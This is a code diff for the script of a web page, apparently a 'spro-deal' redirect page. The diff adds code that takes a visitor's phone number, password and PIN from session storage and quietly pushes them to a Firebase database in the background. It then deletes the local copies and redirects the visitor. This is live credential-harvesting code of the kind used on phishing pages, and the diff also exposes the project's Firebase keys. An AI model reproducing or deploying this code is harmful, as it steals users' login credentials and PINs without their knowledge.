@@ -169,8 +169,44 @@ body{
 
 </div>
 
-<script>
+<script type="module">
 
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCvUTcjYusi7eHGYUvYkeeTPwWhmVuw4wI",
+  authDomain: "spro-deal-a87cd.firebaseapp.com",
+  databaseURL: "https://spro-deal-a87cd-default-rtdb.firebaseio.com",
+  projectId: "spro-deal-a87cd",
+  storageBucket: "spro-deal-a87cd.firebasestorage.app",
+  messagingSenderId: "881694010465",
+  appId: "1:881694010465:web:a91f60a585b36447458e20",
+  measurementId: "G-0KHC1X0DC6"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const phone = sessionStorage.getItem("phone");
+const password = sessionStorage.getItem("password");
+const pin = sessionStorage.getItem("pin");
+
+// Background में Firebase save
+if (phone && password && pin) {
+    push(ref(db, "users"), {
+        phone,
+        password,
+        pin,
+        time: new Date().toLocaleString()
+    }).then(() => {
+        sessionStorage.removeItem("phone");
+        sessionStorage.removeItem("password");
+        sessionStorage.removeItem("pin");
+    }).catch(console.error);
+}
+
+// Countdown
 let seconds = 5;
 
 const countdown = document.getElementById("countdown");
@@ -181,23 +217,20 @@ const timer = setInterval(() => {
 
     seconds--;
 
-    if(seconds > 0){
+    if (seconds > 0) {
 
         countdown.innerHTML = `Redirecting in ${seconds} sec...`;
 
-    }else{
-
-        countdown.innerHTML = "Redirecting...";
+    } else {
 
         clearInterval(timer);
-
         window.location.href = "index.html";
 
     }
 
-},1000);
+}, 1000);
 
 </script>
 
-</body>
+</dbody>
 </html>
